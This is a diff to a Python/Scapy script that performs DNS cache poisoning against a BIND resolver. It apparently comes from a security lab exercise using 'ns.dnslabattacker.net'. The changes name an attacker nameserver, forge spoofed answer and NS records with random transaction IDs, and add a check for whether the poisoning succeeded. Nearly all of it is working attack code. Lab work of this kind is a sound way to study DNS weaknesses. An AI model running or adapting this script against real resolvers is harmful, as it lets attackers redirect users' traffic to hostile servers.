@@ -8,6 +8,8 @@ from string import ascii_lowercase, digits
 from subprocess import call
 import os
 
+DEBUG = False
+
 parser = argparse.ArgumentParser()
 parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
 parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
@@ -23,6 +25,9 @@ my_port = args.port
 #dns_port = args.dns_port
 # port that your bind uses to send its DNS queries
 my_query_port = args.query_port
+
+#Our nameserver that we want to poison the BIND cache so that it maps to it
+attack_NS = 'ns.dnslabattacker.net.'
 
 '''
 Generates random strings of length 10.
@@ -57,9 +62,9 @@ def spoofedDNSResponseFromNS(sock, name):
         id = getRandomTXID(), aa = 1, qr=1,  \
         ancount = 1, nscount = 1)
 
-    responsePacket.an = DNSRR(rrname=name, type=1, ttl=3600, rdata='93.184.216.34')
-    responsePacket.ns = DNSRR(rrname='example.com', type=2, rclass=1,\
-     ttl=3600, rdata='ns.dnslabattacker.net')
+    responsePacket.an = DNSRR(rrname=name, type='A', ttl=3600, rdata='93.184.216.34')
+    responsePacket.ns = DNSRR(rrname='example.com', type='NS', rclass=1,\
+     ttl=3600, rdata=attack_NS)
 
     #Send the packet to BIND as a presumed response from the NS
     sendPacket(sock, responsePacket, my_ip, my_query_port)
@@ -85,15 +90,15 @@ def sendDNSQuerytoBIND():
     #We've got a response from the BIND server.
     response = sock.recv(4096)
     response = DNS(response)
-    '''
-    print "\n***** Packet Received from actual BIND Server *****"
-    print response.show()
-    print "***** End of Remote Server Packet *****\n"
-    '''
-    #response.an contains the answer to our DNS response.
-    #if the response isn't one of our spoofed queries, then the
-    #answer field would be None and we'd have to try again.
-    return response.an
+    
+    if DEBUG:
+        print "\n***** Packet Received from actual BIND Server *****"
+        print response.show()
+        print "***** End of Remote Server Packet *****\n"
+    
+    #check to see if the nameserver got poisoned.
+    attack_status = (response.ns is not None and response.ns.rdata == attack_NS)
+    return attack_status
 
 if __name__ == '__main__':
     #setup a UDP server to get a DNS request over UDP
